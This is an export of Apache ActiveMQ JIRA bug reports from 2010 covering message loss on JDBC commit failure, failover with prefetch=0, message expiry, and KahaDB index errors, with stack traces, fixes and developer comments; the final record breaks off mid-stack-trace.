Exception thrown during commit leads to message loss,AMQ-2880,12483508,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,slewis,slewis,26/Aug/10 12:36,08/Sep/10 16:37,14/Jul/23 05:43,08/Sep/10 16:31,5.4.0,,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"In cases where JDBC persistence is used and the database server is under a fair bit of load it's sometimes possible for table/row locks to time out, which means you'll see exceptions such as:

java.sql.BatchUpdateException: Lock wait timeout exceeded; try restarting transaction
at com.mysql.jdbc.PreparedStatement.executeBatchSerially(PreparedStatement.java:1693)
at com.mysql.jdbc.PreparedStatement.executeBatch(PreparedStatement.java:1108)
at org.apache.commons.dbcp.DelegatingStatement.executeBatch(DelegatingStatement.java:297)
at org.apache.commons.dbcp.DelegatingStatement.executeBatch(DelegatingStatement.java:297)
at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:98)
at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:80)
at org.apache.activemq.store.jdbc.TransactionContext.commit(TransactionContext.java:161)
at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.commitTransaction(JDBCPersistenceAdapter.java:504)
at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:109)
at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:220)
at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:73)
at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:176)
at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
at org.apache.activemq.broker.TransportConnection.processCommitTransactionTwoPhase(TransportConnection.java:430)
at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:102)
at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309)
at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217)
at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219)
at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)
at java.lang.Thread.run(Thread.java:636)

In this case the connection to the database is fine and what we should do is retry the transaction as it's a temporary failure condition.  Instead what happens is the broker moves to the next message in the queue, leaving the current message in the database.  The message won't show up in the web console and cannot be consumed by any consumers until the broker is restarted.

Attached is a test case that simulates the error condition in a controlled fashion by using a subclassed JDBCPersistenceAdapter that will throw an exception in commitTransaction as necessary.  So the producer sends 10 messages and then the consumer tries to consume them, during this time the persistence adapter will throw an exception during commitTransaction.  Then the condition is cleared and the consumer can consume all 10 messages, however the consumer only consumes 9 messages, the 1st message in the sequence is still in the database.  Hopefully the logging makes this clear.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/10 20:48;slewis;patch_for_xa_transaction.txt;https://issues.apache.org/jira/secure/attachment/12461842/patch_for_xa_transaction.txt","26/Aug/10 19:37;slewis;test-case.txt;https://issues.apache.org/jira/secure/attachment/12461775/test-case.txt","26/Aug/10 12:37;slewis;test-case.txt;https://issues.apache.org/jira/secure/attachment/12461774/test-case.txt","07/Sep/10 20:48;slewis;xa-test-case.txt;https://issues.apache.org/jira/secure/attachment/12461841/xa-test-case.txt",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14716,,,Wed Sep 08 16:31:15 UTC 2010,,,,,,,,,,,"0|i0b9sn:",63699,,,,,,,,,,,,,,,,,,,,,"26/Aug/10 15:15;slewis;Just a note to simulate the real lock timeout exception using MySQL you can just lock some rows in the table, for example:

start transaction;
select id from activemq_msgs limit 10 for update;

then try and consume some messages.  ActiveMQ will get block and then get a lock timeout when it hits these locked rows.  Then release the lock with:

commit;

after consuming all of the messages in the queue that you can you'll see those locked rows are still in the table and hadn't been consumed.;;;","26/Aug/10 19:37;slewis;This shows the problem better, as each time a new consumer is created to receive a message from the queue a message is lost.;;;","30/Aug/10 13:03;gtully;https://issues.apache.org/activemq/browse/AMQ-2551 - can result from the checkpoint thread, the fix to this issue ensures that there are no adverse effects to it occurring save the failure of the current operation.;;;","31/Aug/10 15:31;gtully;resolved in r991218

a jms transaction rollback was needed in the even of a store failure on an ack. in addition test case needed maxredeliveries > numMessages to ensure replayed messages were not sent to dlq.
fix an test from patch applied with thanks.;;;","07/Sep/10 16:13;slewis;This problem also occurs with XA transactions (like in the example stack trace) so we need a similar fix for this scenario.;;;","07/Sep/10 17:33;slewis;This should take care of XA transactions.;;;","07/Sep/10 20:48;slewis;Here's a test for XATransaction.  I'm finding however that catching the exception within commit and calling rollback() from there doesn't seem to fix the issue.  Instead it seems like the message is effectively lost, as when the dummy persistent store throws it's exception the message is out of the database, I wouldn't have expected that.  Also to properly rollback in the client I had to call XAResource.start() for some reason, also a bit unexpected.  Anyway, am also attaching the changes I had done to XATransaction.java.;;;","08/Sep/10 16:31;gtully;r995119 
new xa test variant from patch applied. thanks for the work on this one. XA case is now sorted.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover and prefetch=0 can result in hung consumers if the MessagePull command is lost,AMQ-2877,12483483,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,25/Aug/10 10:13,02/Sep/10 20:13,14/Jul/23 05:43,25/Aug/10 10:17,5.4.0,,,,,5.4.1,,,JMS client,,,,0,,,,,,,,,"With prefetch=0,  a consumer that has no messages sends an async message to the broker to have it dispatch a single message and waits for the dispatch to ocurr. prefetch=0 makes the consumer a pull consumer, in that it has to ask for a message each time.

there is a possibility that failover occurs just after the send of the messagePull command such that the consumer  is blocked waiting for a message but a failover connection or broker does not know about the outstanding pull command. The connection state tracker is the normal mechanism for command replay after failover. This needs to be extended to track messagePull commands, keeping one outstanding reference for each consumer/destination pair that can be replayed after failover.
It makes sense to reuse the messageCache for this. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2612,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14822,,,Wed Aug 25 10:17:09 UTC 2010,,,,,,,,,,,"0|i0ba5b:",63756,,,,,,,,,,,,,,,,,,,,,"25/Aug/10 10:17;gtully;resolve in 988974

having a timeout on the wait for pull may also be sensible, lets see.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Message received from Queue before its expiration and acknowledged after it, is put to deadletter queue in error",AMQ-2876,12481834,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,24/Aug/10 09:47,24/Aug/10 09:55,14/Jul/23 05:43,24/Aug/10 09:55,5.3.2,5.4.0,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"message expiry processing in queue subscription when an standard ack is received will process the expired message even though the message has been processed by the consumer. This processing will place the message in the DLQ by default. End result, consumer has the message and DLQ has the message. Because this message was acked before it expired as seen by the consumer but after expiry as seen by the broker, it should not be sent to the DLQ. This holds for expiry checking that is done on receipt of an ACK.

If the reply is lost for some time, and the broker expires the inflight message, the ack will be ignored with a warn and normal expiry processing will ensue. In this case, the broker gets to expire the message completely before the consumer gets to reply.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14788,,,Tue Aug 24 09:55:01 UTC 2010,,,,,,,,,,,"0|i0ba7r:",63767,,,,,,,,,,,,,,,,,,,,,"24/Aug/10 09:55;gtully;fixes in r988455

when processing the ack, the message will no longer be expired as it has been delivered ok. 
If asnyc message expiry processing has already expired the message, then the ack will be ignored and a warning will be issued in the log for that message ack. The act of processing the ack will not result in expiry otherwise.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Need to update the ""Example Configuration using NetworkConnector properties"" in networks-of-brokers.html due to the change made to resolve AMQ-2598 ",AMQ-2873,12481628,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gsaffell,gsaffell,20/Aug/10 14:10,20/Aug/10 15:50,14/Jul/23 05:43,20/Aug/10 15:50,5.4.0,,,,,5.4.1,,,Documentation,,,,0,,,,,,,,,"On http://activemq.apache.org/networks-of-brokers.html, there are several examples showing ""uri=""static://(tcp://..."" Per AMQ-2598, they should be ""uri=""static:(tcp://..."" (remove the ""//"" immediately following ""static:"").",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74769,,,Fri Aug 20 15:50:27 UTC 2010,,,,,,,,,,,"0|i0rpjb:",159781,,,,,,,,,,,,,,,,,,,,,"20/Aug/10 15:50;gtully;done: https://cwiki.apache.org/confluence/display/ACTIVEMQ/Networks+of+Brokers
two refs to composite urls with // removed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Contention between concurrent connection start and new session creation - start can find partially created session,AMQ-2872,12482018,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,19/Aug/10 09:17,19/Aug/10 10:10,14/Jul/23 05:43,19/Aug/10 10:10,5.4.0,,,,,5.4.1,,,JMS client,,,,0,,,,,,,,,"{code}Exception in thread ""Thread-20"" java.lang.NullPointerException
	at org.apache.activemq.ActiveMQSession.start(ActiveMQSession.java:1637)
	at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:508)
	at org.springframework.jms.connection.SingleConnectionFactory$SharedConnectionInvocationHandler.invoke(SingleConnectionFactory.java:514)
	at $Proxy5.start(Unknown Source)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:464)
	at org.springframework.jms.core.JmsTemplate.receiveSelected(JmsTemplate.java:708)
	at org.springframework.jms.core.JmsTemplate.receive(JmsTemplate.java:686)
	at com.iona.cpi.failure.http.HttpLoadTest$Receiver.run(HttpLoadTest.java:90)
	at java.lang.Thread.run(Thread.java:613){code}

Issue is async connection start and session creation. The partially created session is added to the connection too soon.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14819,,,Thu Aug 19 10:10:59 UTC 2010,,,,,,,,,,,"0|i0ba8v:",63772,,,,,,,,,,,,,,,,,,,,,"19/Aug/10 10:10;gtully;fix in r987113;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Starting the broker in a path with a space fails,AMQ-2869,12481868,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,13/Aug/10 13:45,13/Aug/10 20:07,14/Jul/23 05:43,13/Aug/10 13:47,5.4.0,,,,,5.4.0,,,,,,,0,,,,,,,,,"The root of the problem is Jetty issue described here

http://jira.codehaus.org/browse/JETTY-1063

We can workaround the issue, by making sure to escape urls in our classpath",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74770,,,Fri Aug 13 20:07:17 UTC 2010,,,,,,,,,,,"0|i0rqnb:",159961,,,,,,,,,,,,,,,,,,,,,"13/Aug/10 13:47;dejanb;Fixed with svn revision 985198;;;","13/Aug/10 18:05;semog;I'm not an ActiveMQ Java developer, but I can see how the fix put in place will resolve the problem.  However, I did a quick code search, and I came across the call to toURL() in the file ClassLoaderSPIConnectionFactory.java (lines 60 and 67).  Do these calls also need the toURI() pre-treatment added?;;;","13/Aug/10 20:07;dejanb;Hi Jim,

this class is part ofnthe performance test plugin (which is on its own ready for an update), so it's not part of the distribution and shouldn't affect this issue.

Cheers;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NegativeQueueTest and JDBC variant - intermittent failure - missing message when cache exhausted,AMQ-2868,12482179,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/Aug/10 11:01,25/Apr/13 12:34,14/Jul/23 05:43,29/Nov/11 00:26,5.4.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"Test fails trying to consume all messages and misses one message on occasion.
Problem, concurrent transaction completion leaves messages out of order in the cursor w.r.t to the store. When the cursor is exhausted, the cache memory limit is reached and subsequent messages are not cached so the next message needs to be recovered from the store, the point at which we start reading from the store is important. If, at the point at which the cache is full, the cursor is out of order, it can skip a message in the store.
Previously, the entire store was replayed, as if it was never cached and these messages are suppressed by the cursor as duplicates, but there is a size limit and producers spread limit on the duplicate suppression that means messages can avoid duplicate detection. Also, in the case of consumer transactions that rollback, duplicate delivery is required so out of order messages may arrive on a subsequent dispatch.
setBatch, ensuring that messages are replayed form the correct point in the store is important to give ordering guarantees with failover and memory limits, so synchronization of the store and cursor w.r.t concurrent transactions is also needed in support of setBatch.

Store commit and the after completions that update the cursor need to be serialized for a destination to keep make this totally deterministic.
recap, memory limits such that a cache will be filled, concurrent send transaction completion so that store updates and cursor updated can overlap with each other and with cache invalidation. setBatch trying to reduce the replay of messages.

Outstanding question:
- do we make the use of setBatch and transaction sync with store and cursor configurable. If setBatch is off, don't sync. Then at the mercy of consumer transactions and duplicate suppression in the event of failover. An alternative is to make the sync conditional on the use of the cache for a destination. Very reliable but slow; slow is a very relative determination!
Also, may need to be disabled for all destinations as a transaction can span many destinations.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4485,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14555,,,Fri Jun 01 09:19:09 UTC 2012,,,,,,,,,,,"0|i0agzb:",59024,Regression,,,,,,,,,,,,,,,,,,,,"13/Aug/10 11:07;gtully;Added the sync that serialises transaction updated to the store and cursor such that the cursor is always in order w.r.t to the store and setBatch can revert to just where it needs to so that there are no duplicates replayed to the cursor.
r985155
This is the bullet proof approach.
A variant could acquire per destination locks rather than the transaction store lock that is currently used. This would allow more per destination concurrency.;;;","16/Aug/10 17:01;gtully;sticking with the shared lock for the time being.;;;","26/Aug/11 13:02;gtully;This sync is only needed for sends, but it impacts acks so it needs a revisit. it is too heavy handed.
It breaks concurrent consumption on a destination.;;;","26/Aug/11 15:28;gtully;think setBatch needs to take the sync hit as it is the rare event. It may need to wait till store and cursor are in sync.;;;","31/Aug/11 13:14;gtully;Removed the sync and replaced cursor updates with a stack so that they occur in the same order as the index update, but without the need for the index lock or serial commit execution. Concurrent transactions can now wait on a batch write to the journal for their commit record.


http://svn.apache.org/viewvc?rev=1163613&view=rev;;;","28/Nov/11 23:05;gtully;A failed Ack transaction, one that results in UnMatched ack exceptions for example, if this interleaves with non empty transactions, it can cause the non empty transaction to block. Thread stack{code}ActiveMQ Transport: tcp:///xx:34724"" daemon prio=10 tid=0x00002aaab8187000 nid=0xfd9 waiting on condition [0x000000005a13d000]
   java.lang.Thread.State: WAITING (parking)
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x0000000794062330> (a java.util.concurrent.FutureTask$Sync)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:969)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1281)
	at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:218)
	at java.util.concurrent.FutureTask.get(FutureTask.java:83)
	at org.apache.activemq.transaction.Transaction.waitPostCommitDone(Transaction.java:146)
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:73)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:252)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:432)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113){code}

The problem is that the empty transaction completion does not get pushed, it pops the valid transaction completion and runs it. The valid transaction pops nothing and tries again to run the after completion. The empty transaction hangs awaiting completion.
The fix is to run the after completion once we determine that there is no transaction work to be done.

This is a tough one to unit test due the the fact that two commit threads need to cross over in the broker.;;;","29/Nov/11 00:26;gtully;fix in http://svn.apache.org/viewvc?rev=1207693&view=rev;;;","01/Jun/12 09:19;dejanb;Removed synchronisation in MemoryTransactionStore.commit() with 1345023. We don't need it anymore as JDBC message store doesn't have a problem with order or writes and message sequence ids.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
a bug when send time out,AMQ-2867,12483438,12484224,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,dacy.zhouy,dacy.zhouy,12/Aug/10 03:14,27/Nov/10 04:01,14/Jul/23 05:43,13/Aug/10 13:57,5.3.0,,,,,5.4.1,,,Connector,,,,0,,,,,,,,,"  
There is a bug at ActiveMQConnection.java. The response is null when time out,but the code not handled 

	private Response doSyncSendPacket(Command command, int timeout)
			throws JMSException {
		try {
		    Response response = (Response)this.transport.request(command, timeout);
		    if (response != null && response.isException()) {
		        ExceptionResponse er = (ExceptionResponse)response;
		        if (er.getException() instanceof JMSException) {
		            throw (JMSException)er.getException();
		        } else {
		            throw JMSExceptionSupport.create(er.getException());
		        }
		    }
		    return response;
		} catch (IOException e) {
		    throw JMSExceptionSupport.create(e);
		}
	}

",linux/ java,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74771,,,Fri Aug 13 13:57:26 UTC 2010,,,,,,,,,,,"0|i0rpi7:",159776,,,,,,,,,,,,,,,,,,,,,"13/Aug/10 13:57;gtully;resolved in r985201
also related to https://issues.apache.org/activemq/browse/AMQ-2507;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"In SimplePriorityMessageDispatchChannel, message priority isn't properly constrained between 0 and 9",AMQ-2866,12482054,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,scompt,scompt,11/Aug/10 14:55,11/Aug/10 17:40,14/Jul/23 05:43,11/Aug/10 17:40,5.4.0,,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"Per the JMS docs, message priority should be between 0 and 9 inclusive. SimplePriorityMessageDispatchChannel.getPriority attempts to do that, but there's a bug when constraining the priority to be above 0.",,scompt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,300,300,,0%,300,300,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Aug/10 14:55;scompt;SimplePriorityMessageDispatchChannel.getPriority.patch;https://issues.apache.org/jira/secure/attachment/12461795/SimplePriorityMessageDispatchChannel.getPriority.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,43718,,,Wed Aug 11 17:40:06 UTC 2010,,,,,,,Patch Available,,,,"0|i0rpjr:",159783,,,,,,,,,,,,,,,,,,,,,"11/Aug/10 17:40;tabish;Good catch, patch applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ2149KahaDBTest - intermittent missing/out of order message with restart/failover and durable subs,AMQ-2864,12481790,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,10/Aug/10 12:42,29/Oct/14 16:54,14/Jul/23 05:43,17/Aug/10 11:14,5.4.0,,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"intermittent failure, activate of a durable sub and additions to the topic store may need a sync or async store and dispatch topics may need to be disabled.",,asubbiah,gtully,hekonsek,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14799,,,Wed Oct 29 16:54:00 UTC 2014,,,,,,,,,,,"0|i0ba8n:",63771,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"17/Aug/10 11:14;gtully;r986264 - disable concurrentStoreAndDispatchTopics by default as it can lead to cursor being out of order w.r.t to the store such that it is possible in the event that the cache becomes exhausted that some messages are skipped for dispatch till a restart.
With a sufficiently large usage limit the cache will always be valid and concurrentStoreAndDispatchTopics can be used to optimise out persistence for fast durable consumers.;;;","27/Oct/14 14:08;hekonsek;What is ""sufficiently large usage limit""? :);;;","29/Oct/14 03:44;asubbiah;Does this affect virtual topics?;;;","29/Oct/14 12:18;gtully;sufficiently large means that the cursor cache does not get exhausted. In other words, large enough that any backlog can remain in memory. With durable subs that are offline most of the time this will not be practical, so concurrent... is disabled.

This does not affect virtual topics b/c virtual topics are implemented as queues.;;;","29/Oct/14 14:14;asubbiah;Thank you Gary. That's what I would expect. So with concurrent store and dispatch on a virtual topic with persistent messages(multiple subscriber queues) , 
1. Does the producer gets released as soon as the message is published and broker gets a single copy of the message?
OR
2. Does the producer gets released, when the messages gets copied from VT to multiple subscriber queues and the consumers on the subscriber queues acks them.
3. Whats the risk of loosing messages on a VT with concurrent store and dispatch enabled.;;;","29/Oct/14 16:54;gtully;with vt: the producer gets released when a send is enqueued on each of the subscriber queues. there is no risk of message loss. The enqueue is sync, there is no message loss risk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB NPE can occur using random index removes,AMQ-2863,12482315,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,09/Aug/10 15:02,09/Aug/10 16:25,14/Jul/23 05:43,09/Aug/10 16:25,,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"Stack trace looks like:
{code}
java.lang.NullPointerException
	at org.apache.kahadb.index.BTreeNode.getRightLeaf(BTreeNode.java:239)
	at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:314)
	at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292)
	at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292)
	at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292)
	at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292)
	at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292)
	at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292)
	at org.apache.kahadb.index.BTreeIndex.remove(BTreeIndex.java:194)
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74773,,,Mon Aug 09 16:25:23 UTC 2010,,,,,,,,,,,"0|i0rqof:",159966,,,,,,,,,,,,,,,,,,,,,"09/Aug/10 15:04;gtully;another variant of the stack trace:{code}java.lang.NullPointerException
        at org.apache.kahadb.index.BTreeNode.getRightLeaf(BTreeNode.java:239)
        at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:309)
        at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:287)
        at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:287)
        at org.apache.kahadb.index.BTreeIndex.remove(BTreeIndex.java:194)
